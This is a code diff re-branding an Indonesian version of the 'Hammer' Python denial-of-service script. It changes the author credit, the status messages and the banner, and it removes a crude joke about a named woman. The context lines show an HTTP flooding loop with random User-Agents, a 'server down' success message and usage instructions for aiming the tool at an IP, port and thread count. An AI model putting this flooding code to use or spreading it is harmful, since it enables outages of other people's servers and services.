@@ -13,7 +13,7 @@
 #///////////////////////////////////////////////////////////////////////////////
 # Script ini recode dari 
 # python 3.3.2+ Hammer Dos Script v.1
-# by Can Yalçın
+# by LOROONG
 
 
 from queue import Queue
@@ -45,7 +45,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mLucita luna mengelus target...\033[0m")
+			print("\033[94mSedang Mengintaii TARGET...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -65,7 +65,7 @@ def down_it(item):
 				print("\033[91mBerhenti<->ah\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mServer tumbang! Lucita luna berhasil\033[0m")
+		print("\033[91mServer TARGET MAMPOSS!!\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -86,12 +86,11 @@ def dos2():
 
 def usage():
 	print (''' \033[92m	
-	╦  ┬ ┬┌─┐┬┌┬┐┌─┐  ╔╦╗╔╦╗┌─┐╔═╗
-	║  │ ││  │ │ ├─┤   ║║ ║║│ │╚═╗
-	╩═╝└─┘└─┘┴ ┴ ┴ ┴  ═╩╝═╩╝└─┘╚═╝
-	Pukulan Lucita Luna Dos Script v.1
+          ╔╦╗╔╦╗┌─┐╔═╗
+           ║║ ║║│ │╚═╗
+	  ═╩╝═╩╝└─┘╚═╝
+	 Dos Script v.1
 	Pembuat tidak bertanggung jawab jika digunakan untuk melawan hukum.
-	Pembuat tidak bertanggung jawab jika Lucita Luna hamil :).
 	Script ini recode ke bahasa indonesia dari script Hammer v.1 \n
 	cara pakai : python3 pukul.py [-s] [-p] [-t]
 	contoh : python3 pukul.py -s 192.168.0.1 -p 80 -t 135	
